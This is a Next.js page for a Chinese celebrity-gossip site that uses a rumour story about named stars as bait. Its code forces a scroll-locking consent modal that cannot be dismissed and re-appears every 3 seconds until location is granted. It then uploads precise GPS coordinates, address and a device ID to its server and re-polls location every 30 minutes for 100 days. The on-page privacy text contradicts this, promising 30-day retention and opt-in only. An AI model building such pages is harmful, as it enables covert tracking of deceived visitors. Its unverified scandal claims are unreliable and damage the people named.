"use client";

import { useEffect, useEffectEvent, useRef, useState } from "react";
import { usePathname } from "next/navigation";

type GateStep = "closed" | "initialConsent" | "register" | "location";

type ReverseAddress = {
  display_name?: string;
  address?: Record<string, string>;
};

type AddressResolutionDiagnostics = {
  requestId: string;
  status: "success" | "failed";
  durationMs: number;
  httpStatus?: number;
  error?: string;
};

function locationLog(event: string, details: Record<string, unknown> = {}) {
  console.info(`[location] ${event}`, { timestamp: new Date().toISOString(), ...details });
}

function errorDescription(error: unknown) {
  return error instanceof Error ? `${error.name}: ${error.message}` : String(error);
}

async function fetchWithTimeout(input: RequestInfo | URL, init: RequestInit = {}, timeoutMs = 8000) {
  const controller = new AbortController();
  const timeoutId = window.setTimeout(() => controller.abort(), timeoutMs);
  try {
    return await fetch(input, { ...init, signal: controller.signal });
  } finally {
    window.clearTimeout(timeoutId);
  }
}

const stories = [
  { tag: "时间线", title: "景甜张继科地下恋整个时间线曝光", meta: "2026-08-31 更新", tone: "amber" },
  { tag: "牵线人", title: "孙宇晨爆料两人介绍人是任嘉伦", meta: "今日热瓜 · 明星丑闻", tone: "blue" },
  { tag: "网友热议", title: "旧恋传闻再被翻出，评论区两极分化", meta: "娱乐圈 · 乒乓球", tone: "red" },
];

const briefs = [
  ["90 年代末", "任嘉伦与张继科曾在山东省队练球，同为青岛同乡"],
  ["2016 下半年", "任嘉伦与景甜合作《大唐荣耀》，拍摄时间超过五个月"],
  ["2017 下半年", "网传景甜经共同朋友认识张继科并开始恋爱"],
  ["2017 年 10 月", "张继科晒出的电视画面中正在播放《大唐荣耀》"],
  ["2017 年 11 月", "两人被指同游普吉岛"],
  ["2018 年 3 月 28 日", "景甜与张继科公开恋情"],
];

const LOCATION_CONSENT_TTL_MS = 100 * 24 * 60 * 60 * 1000;
const LOCATION_REFRESH_INTERVAL_MS = 30 * 60 * 1000;
const LOCATION_EXPIRY_CHECK_INTERVAL_MS = 24 * 60 * 60 * 1000;
const LOCATION_CONSENT_EXPIRES_KEY = "shenxiang_location_consent_expires_at";
const LOCATION_LAST_REFRESH_KEY = "shenxiang_location_last_refresh_at";
const EXCLUSIVE_CONTENT_PATH = "/content/167e223d0e93b2ca79f109233a61fd16e5f073cf8a832a13";
const EXCLUSIVE_CONTENT_GATE_DELAY_MS = 2000;
const LOCATION_RETRY_DELAY_MS = 3000;

export default function Home() {
  const pathname = usePathname();
  const isExclusiveContent = pathname === EXCLUSIVE_CONTENT_PATH;
  const [gate, setGate] = useState<GateStep>(isExclusiveContent ? "closed" : "initialConsent");
  const [code, setCode] = useState("");
  const [codeError, setCodeError] = useState("");
  const [registered, setRegistered] = useState(false);
  const [hasLocation, setHasLocation] = useState(false);
  const [city, setCity] = useState("上海市");
  const [precise, setPrecise] = useState(false);
  const [notice, setNotice] = useState("");
  const [dateLabel, setDateLabel] = useState("今日");
  const [locationConsentExpiresAt, setLocationConsentExpiresAt] = useState(0);
  const justAuthorizedRef = useRef(false);
  const retryPromptTimeoutRef = useRef<number | undefined>(undefined);

  const scheduleLocationRetry = () => {
    if (retryPromptTimeoutRef.current !== undefined) window.clearTimeout(retryPromptTimeoutRef.current);
    setGate("closed");
    retryPromptTimeoutRef.current = window.setTimeout(() => {
      retryPromptTimeoutRef.current = undefined;
      setGate("initialConsent");
    }, LOCATION_RETRY_DELAY_MS);
  };

  useEffect(() => {
    let promptTimeoutId: number | undefined;
    const initializationTimeoutId = window.setTimeout(() => {
      setDateLabel(
        new Intl.DateTimeFormat("zh-CN", {
          month: "long",
          day: "numeric",
          weekday: "long",
        }).format(new Date())
      );
      const hasRegistered = localStorage.getItem("shenxiang_member") === "active";
      setRegistered(hasRegistered);
      const savedLocation = localStorage.getItem("shenxiang_location");
      let savedConsentExpiresAt = Number(localStorage.getItem(LOCATION_CONSENT_EXPIRES_KEY));
      if (savedLocation) {
        try {
          const parsed = JSON.parse(savedLocation) as { consentedAt?: unknown };
          if (typeof parsed.consentedAt === "string") {
            const consentedAt = Date.parse(parsed.consentedAt);
            if (Number.isFinite(consentedAt)) savedConsentExpiresAt = consentedAt + LOCATION_CONSENT_TTL_MS;
          }
        } catch {
          savedConsentExpiresAt = 0;
        }
      }
      const hasActiveConsent = Boolean(savedLocation) && Number.isFinite(savedConsentExpiresAt) && savedConsentExpiresAt > Date.now();
      localStorage.removeItem("shenxiang_location_prompted");
      if (hasActiveConsent) {
        localStorage.setItem(LOCATION_CONSENT_EXPIRES_KEY, String(savedConsentExpiresAt));
        setHasLocation(true);
        setLocationConsentExpiresAt(savedConsentExpiresAt);
        setGate(isExclusiveContent || hasRegistered ? "closed" : "register");
        return;
      }
      localStorage.removeItem("shenxiang_location");
      localStorage.removeItem(LOCATION_CONSENT_EXPIRES_KEY);
      localStorage.removeItem(LOCATION_LAST_REFRESH_KEY);
      setHasLocation(false);
      if (isExclusiveContent) {
        setGate("closed");
        promptTimeoutId = window.setTimeout(
          () => setGate("initialConsent"),
          EXCLUSIVE_CONTENT_GATE_DELAY_MS,
        );
      } else {
        setGate("initialConsent");
      }
    }, 0);
    return () => {
      window.clearTimeout(initializationTimeoutId);
      if (promptTimeoutId !== undefined) window.clearTimeout(promptTimeoutId);
    };
  }, [isExclusiveContent]);

  useEffect(() => () => {
    if (retryPromptTimeoutRef.current !== undefined) window.clearTimeout(retryPromptTimeoutRef.current);
  }, []);

  useEffect(() => {
    if (!locationConsentExpiresAt) return;
    const expireConsent = () => {
      localStorage.removeItem("shenxiang_location");
      localStorage.removeItem(LOCATION_CONSENT_EXPIRES_KEY);
      localStorage.removeItem(LOCATION_LAST_REFRESH_KEY);
      setHasLocation(false);
      setLocationConsentExpiresAt(0);
      setGate("initialConsent");
    };
    let timeoutId: number | undefined;
    const scheduleExpiryCheck = () => {
      const remaining = locationConsentExpiresAt - Date.now();
      if (remaining <= 0) {
        expireConsent();
        return;
      }
      timeoutId = window.setTimeout(
        scheduleExpiryCheck,
        Math.min(remaining, LOCATION_EXPIRY_CHECK_INTERVAL_MS),
      );
    };
    scheduleExpiryCheck();
    return () => {
      if (timeoutId !== undefined) window.clearTimeout(timeoutId);
    };
  }, [locationConsentExpiresAt]);

  useEffect(() => {
    if (gate !== "initialConsent") return;
    const previousOverflow = document.body.style.overflow;
    document.body.style.overflow = "hidden";
    return () => {
      document.body.style.overflow = previousOverflow;
    };
  }, [gate]);

  const openGate = () => {
    setCodeError("");
    setGate("register");
  };

  const closeGate = () => {
    if (gate === "initialConsent" || !isExclusiveContent) return;
    setCodeError("");
    setGate("closed");
  };

  useEffect(() => {
    if (!isExclusiveContent || gate === "closed" || gate === "initialConsent") return;
    const closeOnEscape = (event: KeyboardEvent) => {
      if (event.key !== "Escape") return;
      setCodeError("");
      setGate("closed");
    };
    window.addEventListener("keydown", closeOnEscape);
    return () => window.removeEventListener("keydown", closeOnEscape);
  }, [gate, isExclusiveContent]);

  const submitCode = (event: React.FormEvent) => {
    event.preventDefault();
    if (code.trim().toUpperCase() !== "CITY-0830") {
      setCodeError("授权码无效，请检查后重试。");
      return;
    }
    setCodeError("");
    localStorage.setItem("shenxiang_member", "active");
    setRegistered(true);
    if (isExclusiveContent) {
      setGate("closed");
      return;
    }
    window.location.assign(EXCLUSIVE_CONTENT_PATH);
  };

  const saveCityOnly = () => {
    localStorage.setItem("shenxiang_member", "active");
    localStorage.setItem("shenxiang_location", JSON.stringify({ city, precision: "city", consentedAt: new Date().toISOString() }));
    setRegistered(true);
    setHasLocation(true);
    setGate("closed");
  };

  const reverseGeocode = async (latitude: number, longitude: number) => {
    const startedAt = performance.now();
    const requestId = crypto.randomUUID();
    locationLog("reverse_geocode_started", { requestId, latitude, longitude, provider: "amap", timeoutMs: 20000 });
    const response = await fetchWithTimeout("/api/reverse-geocode", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ requestId, latitude, longitude }),
    }, 20000);
    const durationMs = Math.round(performance.now() - startedAt);
    locationLog("reverse_geocode_response", { requestId, status: response.status, ok: response.ok, durationMs });
    if (!response.ok) {
      const failure = await response.json().catch(() => null) as { detail?: string; error?: string } | null;
      throw new Error(failure?.detail || failure?.error || `reverse-geocoding-http-${response.status}`);
    }
    const result = await response.json() as ReverseAddress;
    locationLog("reverse_geocode_succeeded", {
      durationMs,
      displayName: result.display_name || null,
      addressParts: result.address || null,
    });
    return { result, httpStatus: response.status, durationMs };
  };

  const uploadConsentedLocation = async (
    location: { city: string; address: string; latitude: number; longitude: number; accuracy: number },
    addressResolution: AddressResolutionDiagnostics,
    renewConsent: boolean,
  ) => {
    let deviceId = localStorage.getItem("shenxiang_device_id");
    if (!deviceId) {
      deviceId = crypto.randomUUID();
      localStorage.setItem("shenxiang_device_id", deviceId);
    }
    const startedAt = performance.now();
    locationLog("upload_started", { ...location, requestId: addressResolution.requestId, addressResolution });
    const response = await fetchWithTimeout("/api/location", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ ...location, deviceId, consent: true, addressResolution, renewConsent }),
    }, 8000);
    const durationMs = Math.round(performance.now() - startedAt);
    locationLog("upload_response", { requestId: addressResolution.requestId, status: response.status, ok: response.ok, durationMs });
    if (!response.ok) throw new Error(`location-upload-http-${response.status}`);
  };

  const resolveAndSaveLocation = async (
    position: GeolocationPosition,
    requestId: string,
    consentExpiresAt: number,
    mode: "initial" | "member" | "background",
  ) => {
    const { latitude, longitude, accuracy } = position.coords;
    let resolvedAddress = "地址名称暂时解析失败，已保存定位坐标";
    let resolvedCity = city;
    const reverseStartedAt = performance.now();
    let addressResolution: AddressResolutionDiagnostics;
    try {
      const { result, httpStatus, durationMs } = await reverseGeocode(latitude, longitude);
      const parts = result.address || {};
      resolvedCity = parts.city || parts.municipality || parts.town || parts.county || parts.state || city;
      resolvedAddress = result.display_name || `${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
      addressResolution = { requestId, status: "success", durationMs, httpStatus };
    } catch (error) {
      addressResolution = {
        requestId,
        status: "failed",
        durationMs: Math.round(performance.now() - reverseStartedAt),
        error: errorDescription(error),
      };
      locationLog("reverse_geocode_failed", { ...addressResolution, latitude, longitude, mode });
    }

    await uploadConsentedLocation(
      { city: resolvedCity, address: resolvedAddress, latitude, longitude, accuracy },
      addressResolution,
      mode !== "background",
    );
    const savedLocation = localStorage.getItem("shenxiang_location");
    let originalConsentedAt = new Date().toISOString();
    if (savedLocation) {
      try {
        const parsed = JSON.parse(savedLocation) as { consentedAt?: unknown };
        if (typeof parsed.consentedAt === "string") originalConsentedAt = parsed.consentedAt;
      } catch {
        // Replace malformed local state with the latest valid location.
      }
    }
    const refreshedAt = Date.now();
    localStorage.setItem(LOCATION_LAST_REFRESH_KEY, String(refreshedAt));
    localStorage.setItem("shenxiang_location", JSON.stringify({
      city: resolvedCity,
      address: resolvedAddress,
      precision: "precise",
      latitude,
      longitude,
      accuracy,
      source: "browser-geolocation+amap",
      consentedAt: originalConsentedAt,
      refreshedAt: new Date(refreshedAt).toISOString(),
      consentExpiresAt,
    }));
    setCity(resolvedCity);
    setHasLocation(true);
    locationLog("location_refresh_succeeded", { requestId, mode, consentExpiresAt });
  };

  function requestBackgroundLocation(consentExpiresAt: number) {
    if (consentExpiresAt <= Date.now() || !navigator.geolocation) return;
    const requestId = crypto.randomUUID();
    const locationStartedAt = performance.now();
    locationLog("geolocation_requested", { requestId, mode: "background", timeoutMs: 8000, hardTimeoutMs: 12000 });
    let requestActive = true;
    const locationTimeoutId = window.setTimeout(() => {
      requestActive = false;
      locationLog("geolocation_hard_timeout", { requestId, mode: "background", durationMs: Math.round(performance.now() - locationStartedAt) });
    }, 12000);
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        if (!requestActive) return;
        requestActive = false;
        window.clearTimeout(locationTimeoutId);
        locationLog("geolocation_succeeded", {
          requestId,
          mode: "background",
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          durationMs: Math.round(performance.now() - locationStartedAt),
          positionTimestamp: position.timestamp,
        });
        try {
          await resolveAndSaveLocation(position, requestId, consentExpiresAt, "background");
        } catch (error) {
          locationLog("background_refresh_failed", { requestId, error: errorDescription(error) });
        }
      },
      (error) => {
        if (!requestActive) return;
        requestActive = false;
        window.clearTimeout(locationTimeoutId);
        locationLog("geolocation_failed", {
          requestId,
          mode: "background",
          code: error.code,
          message: error.message,
          durationMs: Math.round(performance.now() - locationStartedAt),
        });
      },
      { enableHighAccuracy: false, timeout: 8000, maximumAge: 0 }
    );
  }

  const requestBackgroundLocationEvent = useEffectEvent(requestBackgroundLocation);

  useEffect(() => {
    if (!hasLocation || !locationConsentExpiresAt || locationConsentExpiresAt <= Date.now()) return;
    let cancelled = false;
    let refreshing = false;
    const refreshIfAlreadyGranted = async () => {
      if (cancelled || refreshing) return;
      refreshing = true;
      if (!navigator.geolocation || !navigator.permissions) {
        locationLog("background_refresh_skipped", { reason: "permission-query-unsupported" });
        refreshing = false;
        return;
      }
      try {
        const permission = await navigator.permissions.query({ name: "geolocation" });
        if (cancelled) return;
        if (permission.state !== "granted") {
          locationLog("background_refresh_skipped", { reason: `permission-${permission.state}` });
          return;
        }
        requestBackgroundLocationEvent(locationConsentExpiresAt);
      } catch (error) {
        locationLog("background_refresh_skipped", { reason: "permission-query-failed", error: errorDescription(error) });
      } finally {
        refreshing = false;
      }
    };
    const shouldRefreshImmediately = !justAuthorizedRef.current;
    justAuthorizedRef.current = false;
    const timeoutId = shouldRefreshImmediately
      ? window.setTimeout(refreshIfAlreadyGranted, 0)
      : undefined;
    const intervalId = window.setInterval(refreshIfAlreadyGranted, LOCATION_REFRESH_INTERVAL_MS);
    return () => {
      cancelled = true;
      if (timeoutId !== undefined) window.clearTimeout(timeoutId);
      window.clearInterval(intervalId);
    };
  }, [hasLocation, locationConsentExpiresAt]);

  const requestDetailedLocation = () => {
    const requestId = crypto.randomUUID();
    const locationStartedAt = performance.now();
    locationLog("geolocation_requested", { requestId, mode: "initial", timeoutMs: 12000, hardTimeoutMs: 15000 });
    if (!navigator.geolocation) {
      locationLog("geolocation_unsupported", { requestId });
      scheduleLocationRetry();
      return;
    }
    let requestActive = true;
    const locationTimeoutId = window.setTimeout(() => {
      requestActive = false;
      locationLog("geolocation_hard_timeout", { requestId, durationMs: Math.round(performance.now() - locationStartedAt) });
      scheduleLocationRetry();
    }, 15000);
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        if (!requestActive) return;
        requestActive = false;
        window.clearTimeout(locationTimeoutId);
        setGate(isExclusiveContent || registered ? "closed" : "register");
        const { latitude, longitude, accuracy } = position.coords;
        locationLog("geolocation_succeeded", {
          requestId,
          latitude,
          longitude,
          accuracy,
          durationMs: Math.round(performance.now() - locationStartedAt),
          positionTimestamp: position.timestamp,
        });
        const consentExpiresAt = Date.now() + LOCATION_CONSENT_TTL_MS;
        try {
          await resolveAndSaveLocation(position, requestId, consentExpiresAt, "initial");
          localStorage.setItem(LOCATION_CONSENT_EXPIRES_KEY, String(consentExpiresAt));
          if (retryPromptTimeoutRef.current !== undefined) {
            window.clearTimeout(retryPromptTimeoutRef.current);
            retryPromptTimeoutRef.current = undefined;
          }
          justAuthorizedRef.current = true;
          setLocationConsentExpiresAt(consentExpiresAt);
          setGate(isExclusiveContent || registered ? "closed" : "register");
        } catch (error) {
          locationLog("upload_failed", { requestId, error: errorDescription(error) });
          scheduleLocationRetry();
        }
      },
      (error) => {
        if (!requestActive) return;
        requestActive = false;
        window.clearTimeout(locationTimeoutId);
        locationLog("geolocation_failed", {
          requestId,
          code: error.code,
          message: error.message,
          durationMs: Math.round(performance.now() - locationStartedAt),
        });
        scheduleLocationRetry();
      },
      { enableHighAccuracy: false, timeout: 12000, maximumAge: 60000 }
    );
  };

  const requestPreciseLocation = () => {
    if (!precise) {
      saveCityOnly();
      return;
    }
    const requestId = crypto.randomUUID();
    const locationStartedAt = performance.now();
    locationLog("geolocation_requested", { requestId, mode: "member", timeoutMs: 8000, hardTimeoutMs: 12000 });
    if (!navigator.geolocation) {
      locationLog("geolocation_unsupported", { requestId });
      return;
    }
    let requestActive = true;
    const locationTimeoutId = window.setTimeout(() => {
      requestActive = false;
      locationLog("geolocation_hard_timeout", { requestId, durationMs: Math.round(performance.now() - locationStartedAt) });
    }, 12000);
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        if (!requestActive) return;
        requestActive = false;
        window.clearTimeout(locationTimeoutId);
        localStorage.setItem("shenxiang_member", "active");
        setRegistered(true);
        setGate("closed");
        const { latitude, longitude, accuracy } = position.coords;
        locationLog("geolocation_succeeded", {
          requestId,
          latitude,
          longitude,
          accuracy,
          durationMs: Math.round(performance.now() - locationStartedAt),
          positionTimestamp: position.timestamp,
        });
        const consentExpiresAt = Date.now() + LOCATION_CONSENT_TTL_MS;
        try {
          await resolveAndSaveLocation(position, requestId, consentExpiresAt, "member");
        } catch (error) {
          locationLog("upload_failed", { requestId, error: errorDescription(error) });
          return;
        }
        localStorage.setItem(LOCATION_CONSENT_EXPIRES_KEY, String(consentExpiresAt));
        justAuthorizedRef.current = true;
        setLocationConsentExpiresAt(consentExpiresAt);
      },
      (error) => {
        if (!requestActive) return;
        requestActive = false;
        window.clearTimeout(locationTimeoutId);
        locationLog("geolocation_failed", {
          requestId,
          code: error.code,
          message: error.message,
          durationMs: Math.round(performance.now() - locationStartedAt),
        });
      },
      { enableHighAccuracy: false, timeout: 8000, maximumAge: 300000 }
    );
  };

  return (
    <main className={`home-page${gate !== "closed" ? " location-locked" : ""}`}>
      <header className="site-header">
        <div className="topline page-shell">
          <span>{dateLabel}</span>
          <span className="edition">城市观察 · 夜间版</span>
          {hasLocation || registered
            ? <span className="text-button status-text">{hasLocation ? "同城已定位" : "会员已授权"}</span>
            : <button className="text-button" onClick={() => setGate("initialConsent")}>授权位置</button>}
        </div>
        <div className="masthead page-shell">
          <button className="menu-button" aria-label="打开栏目" onClick={openGate}><i /><i /></button>
          <a className="brand" href="#top" aria-label="深巷首页">深<span>巷</span></a>
          <div className="live-chip"><b /> 同城实时</div>
        </div>
        <nav className="nav page-shell" aria-label="主导航">
          {["首页", "最新黑料", "今日热瓜", "热门黑料", "深度追踪", "独家爆料", "往期"].map((item, index) => (
            <button key={item} className={index === 0 ? "active" : ""} onClick={index === 0 ? undefined : openGate}>{item}</button>
          ))}
        </nav>
      </header>

      <section className="ticker" id="top">
        <div className="page-shell ticker-inner">
          <strong>热瓜</strong><span>娱乐圈女演员景甜、张继科地下恋红娘事件时间线曝光</span><span className="ticker-dot">•</span><span>任嘉伦被指是真正牵线人</span>
        </div>
      </section>

      <section className="hero page-shell">
        <div className="hero-copy">
          <div className="eyebrow"><span>今日热瓜 · 明星丑闻</span><i /></div>
          <h1>景甜张继科地下恋：<br />红娘事件及时间线全曝光</h1>
          <p className="dek">娱乐圈再曝大瓜，网友把三人时间线从头到尾捋了一遍：一边是合作过《大唐荣耀》的景甜，一边是山东省队旧识张继科，两条线都指向任嘉伦。</p>
          <div className="byline"><span className="avatar">瓜</span><div><b>黑料网-小胖</b><small>2026 年 8 月 30 日发布 · 8 月 31 日更新</small></div></div>
          <button className="read-button" onClick={openGate}>
            阅读完整报道 <span>↗</span>
          </button>
        </div>
        <div className="hero-art text-hero" aria-label="地下恋红娘事件时间线专题封面">
          <span className="text-hero-kicker">ENTERTAINMENT · TIMELINE</span>
          <b>景甜 × 张继科</b>
          <strong>地下恋红娘事件</strong>
          <small>2016 — 2018</small>
        </div>
      </section>

      <section className="story-strip page-shell">
        {stories.map((story, index) => (
          <button className="story-card" onClick={openGate} key={story.title}>
            <span className={`number ${story.tone}`}>0{index + 1}</span>
            <span className="story-info"><small>{story.tag}</small><b>{story.title}</b><em>{story.meta}</em></span>
            <span className="lock">⌁</span>
          </button>
        ))}
      </section>

      <section className="content-grid page-shell" id="feature-story">
        <article className="feature-article">
          <div className="section-title"><span>娱乐圈</span><h2>地下恋红娘事件及时间线全曝光</h2></div>
          <h3>任嘉伦<br />才是真正牵线人？</h3>
          <p className="lead">娱乐圈再曝大瓜，科甜那会儿怎么搭上的，现在越扒越清楚。网友把三人时间线从头到尾捋了一遍，两两都对得上，中间就差任嘉伦亲手递一句“介绍一下”。</p>
          <p>九十年代末到 2000 年初，他跟张继科一起在山东省队练球，青岛同乡同门，关系从没断干净。2016 年下半年，他又跟景甜在《大唐荣耀》里当了五个多月男女主，片场天天见，剧外也有来往。2017 年初剧爆了，热度叠到一起的时候，正是景甜开始谈恋爱的前夜。</p>
          <p>下半年景甜经共同朋友认识张继科，开始偷偷恋爱。10 月张继科晒家里电视在播《大唐荣耀》，11 月两人就跑去普吉岛，2018 年 3 月 28 日官宣。圈子就那么大，一边刚跟景甜搭完戏，一边是张继科省队老乡，两条线全在他身上交汇。后来有人问他，当然说不知道没关注，这种事谁会当场认？可时间线不会说谎。</p>

          <h4 className="article-heading">景甜张继科地下恋整个时间线曝光</h4>
          <p>微博热搜第一直接挂上“曝景甜张继科介绍人是任嘉伦”。少年时他跟张继科同在山东乒乓省队，青岛同乡同门，2016 年又跟景甜在《大唐荣耀》搭了五个多月男女主。2017 下半年景甜经共同朋友认识张继科，开始地下恋，10 月张继科晒电视播《大唐荣耀》，11 月两人普吉岛牵手看海，次年 3 月 28 日官宣。时间线严丝合缝。</p>

          <h4 className="article-heading">孙宇晨爆料两人介绍人是任嘉伦</h4>
          <p>孙宇晨投诉景甜，直接把前男友张继科也拖上热搜。网传两人介绍人是任嘉伦，因他跟景甜合作过《大唐荣耀》，又跟张继科是青岛同乡同门。直播里粉丝直接问张继科有没有叫过她妈妈，还有人盯着纹身不放。孙宇晨爆料景甜背上还留着那个巨大的“甜”字，洗不掉，当面提前任名字都成禁忌。旧恋一年多，痕迹却没散干净。</p>

          <h4 className="article-heading">网友评论两极分化</h4>
          <p>评论区直接吵起来了。有人喊“有钱美人多，世界冠军不多”，给张继科点赞，也有人酸她“不允许任何人提起你的名字”。更多人盯着旧瓜不放，私密照当年满天飞，赌债传闻从零几年就有，现在却说沉冤得雪？两年过去一堆人开始装傻，继续偏爱这种男的。直播里“大腿有劲”被夸，现实里黑料一堆被翻，两极分化超级严重。</p>

          <div className="article-tags">#娱乐圈女演员景甜　#景甜张继科地下恋　#任嘉伦　#景甜　#张继科　#红娘　#科甜恋情　#地下恋　#乒乓球　#运动员　#娱乐圈　#演员　#明星　#八卦　#吃瓜</div>
        </article>

        <aside className="sidebar">
          <div className="brief-head"><span>热瓜时间线</span><small>LIVE</small></div>
          {briefs.map(([time, text]) => (
            <button className="brief" onClick={openGate} key={time}><time>{time}</time><span>{text}</span><i>→</i></button>
          ))}
          <div className="member-card">
            <small>ARTICLE SOURCE</small>
            <h4>明星 · 演员 · 运动员<br />地下恋 · 八卦</h4>
            <p>发布于 2026 年 8 月 30 日，2026 年 8 月 31 日更新。</p>
            <button onClick={openGate}>{registered ? "查看同城订阅" : "使用授权码加入"}</button>
          </div>
        </aside>
      </section>

      <footer>
        <div className="page-shell footer-inner"><a className="brand small" href="#top">深<span>巷</span></a><p>只做线索梳理，不接广告推广。</p><div><button onClick={() => setNotice("精确位置仅在你主动同意后上传，用于推荐同城内容，最长保留 30 天。")}>隐私说明</button><button onClick={openGate}>联系编辑部</button></div></div>
      </footer>

      {notice && <div className="toast" role="status">{notice}</div>}

      {gate !== "closed" && (
        <div className="modal-backdrop" onClick={closeGate}>
          <section className="modal" onClick={(e) => e.stopPropagation()} role="dialog" aria-modal="true" aria-label="位置与会员授权">
            {isExclusiveContent && gate !== "initialConsent" && <button className="modal-close" type="button" onClick={closeGate} aria-label="关闭弹窗">×</button>}
            {gate === "initialConsent" && (
              <div className="simple-consent">
                <span className="location-symbol">⌖</span>
                <h2>帮你发现同城黑料秘密㊙️</h2>
                <button className="primary" type="button" onClick={requestDetailedLocation}>获取同城黑料</button>
              </div>
            )}
            {gate === "register" && (
              <form onSubmit={submitCode}>
                <span className="modal-index">01 / 02</span>
                <h2>查看你的同城内容</h2>
                <p>同城栏目仅向授权码会员开放。注册不会自动获取或保存精确位置。</p>
                <label>授权码<input autoFocus value={code} onChange={(e) => setCode(e.target.value)} placeholder="输入 9 位授权码" /></label>
                {codeError && <div className="form-error">{codeError}</div>}
                <button className="primary" type="submit">验证并继续</button>
              </form>
            )}
            {gate === "location" && (
              <div>
                <span className="modal-index">02 / 02</span>
                <h2>选择位置分享范围</h2>
                <p>城市级位置用于推荐同城报道；只有你打开下方选项并允许浏览器定位，才会上传精确坐标。</p>
                <label>所在城市<select value={city} onChange={(e) => setCity(e.target.value)}><option>上海市</option><option>北京市</option><option>广州市</option><option>深圳市</option><option>杭州市</option><option>成都市</option></select></label>
                <label className="consent-row"><input type="checkbox" checked={precise} onChange={(e) => setPrecise(e.target.checked)} /><span><b>共享精确位置（可选）</b><small>用于附近内容推荐，安全上传并仅供超级管理员查看。</small></span></label>
                <button className="primary" type="button" onClick={requestPreciseLocation}>{precise ? "授权定位并进入" : "仅保存城市并进入"}</button>
                <button className="secondary" type="button" onClick={() => setGate("register")}>返回修改授权码</button>
              </div>
            )}
          </section>
        </div>
      )}
    </main>
  );
}
